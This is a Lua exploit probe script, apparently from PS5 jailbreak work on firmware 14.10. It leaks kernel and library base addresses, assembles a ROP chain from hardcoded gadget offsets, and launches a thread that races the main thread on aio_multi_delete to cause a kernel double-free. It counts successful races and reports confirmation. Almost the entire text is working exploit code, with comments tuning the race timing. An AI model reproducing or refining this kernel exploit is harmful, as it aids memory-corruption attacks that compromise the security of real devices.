-- CRASH_CLASS: HIGH
-- PROBE 555f: yield-then-race model for aio_multi_delete double-free
--
-- Key finding from 555e: PS5 scheduler won't preempt main during tight
-- Lua loops. Child only runs when main calls a syscall that yields.
--
-- New model: both threads use a TWO-PHASE approach:
--   Phase 1: Child sets up TLS, signals READY, then spin-waits for GO
--   Phase 2: Main detects READY (with periodic yield), sets GO, calls delete
--   Both enter delete within microseconds (child sees GO via tight spin)
--
-- The child's tight spin is in ROP (native speed, no Lua overhead),
-- so it detects GO within nanoseconds of the main writing it.

print("=== PROBE 555f: YIELD-RACE MODEL ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", N(v))
end

local Z = uint64(0)
local sc20  = mk(20)
local sc6   = mk(6)
local sc135 = mk(135)
local sc331 = mk(331)  -- sched_yield
local sc455 = mk(455)
local sc477 = mk(477)
local sc669 = mk(669)
local sc662 = mk(662)
local sc664 = mk(664)
local sc666 = mk(666)

local pid = N(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax   = eb + uint64(0x992)
local pop_rdi   = eb + uint64(0xC9DFE)
local pop_rsi   = eb + uint64(0xD77D)
local pop_rdx   = eb + uint64(0x3B02D7)
local pop_rcx   = eb + uint64(0xE64)
local mov_m_rax = eb + uint64(0x92C67)   -- mov [rdi], rax; ret
local bare_ret  = eb + uint64(0x42)
local fn_addr   = lk + uint64(0xB57)

-- We need a "spin on dword at [addr] until != 0" gadget.
-- We don't have cmp/jne in our catalog.
-- Alternative: child calls sched_yield in a loop via ROP.
-- But that's complex. Simpler: child does sysarch → READY → getpid loop → delete.
-- The getpid loop adds ~N*5μs of delay. Main sees READY → sets GO (not needed) → delete.
--
-- Actually even simpler: the main just needs to YIELD so the child runs.
-- Once the child has run its sysarch + READY, the main resumes.
-- The main sees READY (because the child wrote it during the yield).
-- Then main calls delete immediately.
-- The child continues its chain (it wrote READY, then immediately calls delete).
-- Both are now in delete at roughly the same time.
--
-- The gap is: child writes READY, then ROP to delete (~4 gadget pops, ~30ns).
-- Main resumes from yield, reads READY in Lua (~5μs), calls delete (~5μs).
-- Child enters kernel ~10μs before main. For 32 entries, that's ~10μs of processing.
-- So there IS overlap.
--
-- Better: child does READY → N getpid calls (delay) → delete.
-- This gives main time to see READY and enter delete before child does.

local BATCH  = 32
local ROUNDS = 200

local ok_sh, shared = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
print("shared=" .. q(shared))
local shared_n = N(shared)

local ready_addr  = shared_n + 0x000
local done_addr   = shared_n + 0x004
local ids_addr    = shared_n + 0x010
local child_errs  = shared_n + 0x200
local main_errs   = shared_n + 0x400

-- Fake TCB
local ok_tcb, tcb_page = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
for i = 0, 0x100, 8 do wq(tcb_page + i, tcb_page) end
local tcb_ptr_buf = memory.alloc(8)
wq(tcb_ptr_buf, tcb_page)

-- Child stack
local ok_stk, stack_base = pcall(function()
    return sc477(Z, uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local rsp = N(stack_base) + 0x100000 - 8

-- Build child chain: sysarch → READY → 20x getpid (delay) → delete → DONE → exit
local function build_chain()
    local pos = 0
    local function emit(v) wq(uint64(rsp + pos), v); pos = pos + 8 end

    -- sysarch(165, 129, tcb_ptr_buf)
    emit(pop_rdi); emit(uint64(129))
    emit(pop_rsi); emit(uint64(N(tcb_ptr_buf)))
    emit(pop_rax); emit(uint64(165))
    emit(fn_addr)

    -- READY marker
    emit(pop_rax); emit(uint64(0xBEEF))
    emit(pop_rdi); emit(uint64(ready_addr))
    emit(mov_m_rax)

    -- 20x getpid calls as delay (~100μs total)
    -- This gives main time to see READY and start its delete
    for d = 1, 20 do
        emit(pop_rax); emit(uint64(20))
        emit(fn_addr)
    end

    -- aio_multi_delete(662)
    emit(pop_rdi); emit(uint64(ids_addr))
    emit(pop_rsi); emit(uint64(BATCH))
    emit(pop_rdx); emit(uint64(child_errs))
    emit(pop_rax); emit(uint64(662))
    emit(fn_addr)

    -- DONE marker
    emit(pop_rax); emit(uint64(0xDEAD))
    emit(pop_rdi); emit(uint64(done_addr))
    emit(mov_m_rax)

    -- thr_exit(431)
    emit(pop_rdi); emit(Z)
    emit(pop_rax); emit(uint64(431))
    emit(fn_addr)

    return pos
end

local chain_sz = build_chain()
print("chain=" .. chain_sz .. "B (" .. (chain_sz/8) .. " slots, 20 delay calls)")

-- thr_param
local tp = memory.alloc(0x40); zero(tp, 0x40)
wq(tp, bare_ret)
wq(tp + 0x10, stack_base)
wq(tp + 0x18, uint64(0x100008))

-- Reusable buffers
local sv      = memory.alloc(16)
local scratch = memory.alloc(0x1000)
local reqs    = memory.alloc(BATCH * 0x28 + 16)
local ids_tmp = memory.alloc(BATCH * 4 + 16)
local cst     = memory.alloc(BATCH * 4 + 16)
local poll_st = memory.alloc(BATCH * 4 + 16)

print(string.format("\nRacing %d rounds, batch=%d (yield model)", ROUNDS, BATCH))

local total_wins = 0
local main_clean = 0
local child_clean = 0
local mixed = 0
local timeouts = 0
local not_ready = 0

for round = 1, ROUNDS do
    local fds_r = {}
    local fds_w = {}
    local ok_sp = true
    for i = 1, BATCH do
        local ok, v = pcall(function()
            return sc135(uint64(1), uint64(1), Z, uint64(N(sv)))
        end)
        if ok and N(v) >= 0 then
            fds_r[i] = rd(sv)
            fds_w[i] = rd(sv + 4)
        else
            ok_sp = false; break
        end
    end

    if not ok_sp then
        if round <= 3 then print("R" .. round .. ": socketpair fail") end
    else
        -- Submit AIO
        for i = 0, BATCH - 1 do
            local base = reqs + i * 0x28
            wq(base + 0x00, Z)
            wq(base + 0x08, uint64(0x1000))
            wq(base + 0x10, uint64(N(scratch)))
            wq(base + 0x18, Z)
            wd(base + 0x20, fds_r[i + 1])
            wd(base + 0x24, 0)
        end
        for i = 0, BATCH - 1 do wd(ids_tmp + i * 4, 0) end
        pcall(function()
            sc669(uint64(0x1001), uint64(N(reqs)), uint64(BATCH),
                uint64(3), uint64(N(ids_tmp)))
        end)

        -- Cancel + close peers
        pcall(function()
            sc666(uint64(N(ids_tmp)), uint64(BATCH), uint64(N(cst)))
        end)
        for i = 1, BATCH do
            pcall(function() sc6(uint64(fds_w[i])) end)
        end

        -- Poll terminal
        local all_term = false
        for try = 1, 100 do
            pcall(function()
                sc664(uint64(N(ids_tmp)), uint64(BATCH), uint64(N(poll_st)))
            end)
            all_term = true
            for i = 0, BATCH - 1 do
                local s = rd(poll_st + i * 4)
                if not s or s < 3 then all_term = false; break end
            end
            if all_term then break end
        end

        if all_term then
            -- Copy IDs to shared memory
            for i = 0, BATCH - 1 do
                wd(ids_addr + i * 4, rd(ids_tmp + i * 4) or 0)
            end
            wd(ready_addr, 0)
            wd(done_addr, 0)
            for i = 0, BATCH - 1 do
                wd(child_errs + i * 4, 0x77777777)
                wd(main_errs + i * 4, 0x77777777)
            end

            -- Launch child
            pcall(function()
                sc455(uint64(N(tp)), uint64(0x38))
            end)

            -- Yield-based wait for READY (each yield = scheduler runs child)
            local ready = false
            local yield_count = 0
            for y = 1, 200 do
                pcall(function() sc331() end)  -- sched_yield
                yield_count = y
                if (rd(ready_addr) or 0) == 0xBEEF then
                    ready = true; break
                end
            end

            if not ready then
                not_ready = not_ready + 1
            else
                -- Main calls delete IMMEDIATELY after seeing READY
                -- Child is in its 20-getpid delay, about to enter delete
                pcall(function()
                    sc662(uint64(ids_addr), uint64(BATCH), uint64(main_errs))
                end)
            end

            -- Wait for child done (with yields)
            for w = 1, 500 do
                if (rd(done_addr) or 0) == 0xDEAD then break end
                if w % 10 == 0 then pcall(function() sc331() end) end
            end
            local child_done = (rd(done_addr) or 0) == 0xDEAD
            if not child_done then timeouts = timeouts + 1 end

            -- Analyze results
            if ready then
                local win_count = 0
                local m_ok = 0
                local c_ok = 0
                for i = 0, BATCH - 1 do
                    local ce = rd(child_errs + i * 4) or 0x77777777
                    local me = rd(main_errs + i * 4) or 0x77777777
                    if ce == 0 and me == 0 then win_count = win_count + 1 end
                    if me == 0 then m_ok = m_ok + 1 end
                    if ce == 0 then c_ok = c_ok + 1 end
                end

                if win_count > 0 then
                    total_wins = total_wins + win_count
                    print(string.format("R%d: *** DOUBLE-FREE %d/%d slots yield=%d ***",
                        round, win_count, BATCH, yield_count))
                end

                if m_ok == BATCH then main_clean = main_clean + 1
                elseif c_ok == BATCH then child_clean = child_clean + 1
                elseif m_ok > 0 and c_ok > 0 then mixed = mixed + 1
                end
            end

            -- Progress
            if round % 25 == 0 then
                print(string.format("  r=%d w=%d mc=%d cc=%d mx=%d nr=%d to=%d",
                    round, total_wins, main_clean, child_clean, mixed,
                    not_ready, timeouts))
            end
        end

        -- Cleanup
        for i = 1, BATCH do
            pcall(function() sc6(uint64(fds_r[i])) end)
        end
    end
end

print("")
local pid2 = N(sc20())
print(string.format("TOTAL: rounds=%d wins=%d main=%d child=%d mixed=%d noready=%d timeout=%d pid=%d%s",
    ROUNDS, total_wins, main_clean, child_clean, mixed, not_ready, timeouts, pid2,
    pid2 == pid and " OK" or " CHANGED"))

if total_wins > 0 then
    print(">>> DOUBLE-FREE CONFIRMED ON 14.10 <<<")
elseif mixed > 0 then
    print("interleaving detected (" .. mixed .. " rounds) but no double-free yet")
    print("the per-entry race window may be too narrow — need more rounds or tuning")
else
    print("no interleaving — timing still off")
end
print("=== 555f DONE ===")
